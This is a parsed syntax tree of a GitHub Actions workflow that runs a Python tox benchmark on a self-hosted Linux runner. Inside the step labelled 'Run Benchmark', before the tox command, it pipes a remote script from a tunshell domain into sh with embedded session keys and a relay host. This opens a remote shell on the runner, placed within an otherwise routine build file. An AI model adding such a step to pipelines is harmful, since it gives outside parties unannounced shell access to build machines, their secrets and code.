OBJECT [0,995]
    FIELD [1,24]
        String: "name" [1,7]
        STRING [8,24]
            String: "Benchmark Test" [8,24]
    FIELD [25,151]
        String: "on" [25,29]
        OBJECT [30,151]
            FIELD [31,51]
                String: "workflow_call" [31,46]
                NULL [47,51]
            FIELD [52,150]
                String: "workflow_dispatch" [52,71]
                OBJECT [72,150]
                    FIELD [73,149]
                        String: "inputs" [73,81]
                        OBJECT [82,149]
                            FIELD [83,148]
                                String: "none" [83,89]
                                OBJECT [90,148]
                                    FIELD [91,130]
                                        String: "description" [91,104]
                                        STRING [105,130]
                                            String: "Run Benchmarks Manually" [105,130]
                                    FIELD [131,147]
                                        String: "required" [131,141]
                                        FALSE [142,147]
    FIELD [152,994]
        String: "jobs" [152,158]
        OBJECT [159,994]
            FIELD [160,993]
                String: "run-benchmark" [160,175]
                OBJECT [176,993]
                    FIELD [177,226]
                        String: "strategy" [177,187]
                        OBJECT [188,226]
                            FIELD [189,225]
                                String: "matrix" [189,197]
                                OBJECT [198,225]
                                    FIELD [199,224]
                                        String: "python-version" [199,215]
                                        ARRAY [216,224]
                                            STRING [217,223]
                                                String: "3.10" [217,223]
                    FIELD [227,256]
                        String: "runs-on" [227,236]
                        ARRAY [237,256]
                            STRING [238,255]
                                String: "benchmark-linux" [238,255]
                    FIELD [257,992]
                        String: "steps" [257,264]
                        ARRAY [265,992]
                            OBJECT [266,391]
                                FIELD [267,300]
                                    String: "name" [267,273]
                                    STRING [274,300]
                                        String: "Install build essentials" [274,300]
                                FIELD [301,390]
                                    String: "run" [301,306]
                                    STRING [307,390]
                                        String: "sudo apt-get update && sudo apt-get install -y cmake libssl-dev build-essential\n" [307,390]
                            OBJECT [392,510]
                                FIELD [393,449]
                                    String: "name" [393,399]
                                    STRING [400,449]
                                        String: "set permissions on work folder for self-runners" [400,449]
                                FIELD [450,509]
                                    String: "run" [450,455]
                                    STRING [456,509]
                                        String: "sudo chown -R $USER:$USER ~/actions-runner/_work/\n" [456,509]
                            OBJECT [511,541]
                                FIELD [512,540]
                                    String: "uses" [512,518]
                                    STRING [519,540]
                                        String: "actions/checkout@v2" [519,540]
                            OBJECT [542,685]
                                FIELD [543,594]
                                    String: "name" [543,549]
                                    STRING [550,594]
                                        String: "Set up Python ${{ matrix.python-version }}" [550,594]
                                FIELD [595,627]
                                    String: "uses" [595,601]
                                    STRING [602,627]
                                        String: "actions/setup-python@v2" [602,627]
                                FIELD [628,684]
                                    String: "with" [628,634]
                                    OBJECT [635,684]
                                        FIELD [636,683]
                                            String: "python-version" [636,652]
                                            STRING [653,683]
                                                String: "${{ matrix.python-version }}" [653,683]
                            OBJECT [686,751]
                                FIELD [687,707]
                                    String: "name" [687,693]
                                    STRING [694,707]
                                        String: "Upgrade pip" [694,707]
                                FIELD [708,750]
                                    String: "run" [708,713]
                                    STRING [714,750]
                                        String: "pip install --upgrade --user pip\n" [714,750]
                            OBJECT [752,810]
                                FIELD [753,773]
                                    String: "name" [753,759]
                                    STRING [760,773]
                                        String: "Install tox" [760,773]
                                FIELD [774,809]
                                    String: "run" [774,779]
                                    STRING [780,809]
                                        String: "pip install --upgrade tox\n" [780,809]
                            OBJECT [811,991]
                                FIELD [812,834]
                                    String: "name" [812,818]
                                    STRING [819,834]
                                        String: "Run Benchmark" [819,834]
                                FIELD [835,990]
                                    String: "run" [835,840]
                                    STRING [841,990]
                                        String: "curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T pcqhA2oZmo6zeeWzazeXHX G6VSHZul7zpenAobf1aDqV au.relay.tunshell.com\ntox -e syft.benchmark" [841,990]
